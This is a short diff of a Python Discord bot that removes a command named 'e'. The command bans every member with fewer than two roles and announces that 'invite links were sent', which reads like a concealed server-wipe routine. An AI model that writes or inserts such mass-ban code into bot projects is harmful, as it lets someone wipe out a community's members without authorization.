@@ -52,14 +52,7 @@ async def paypal(ctx):
 
     await message.delete()
 
-@bot.command()
-async def e(ctx):
-    for member in ctx.guild.members:
-        if len(member.roles) < 2:
-            await member.ban(reason="none")
-            await ctx.send(f"**{member.display_name}** was banned and invite links were sent. :white_check_mark:")
-            print(f"Banned {member.display_name} and invite links were sent.")
-    print("Banning complete!")
+
 
 @bot.event
 async def on_command_error(ctx, error):
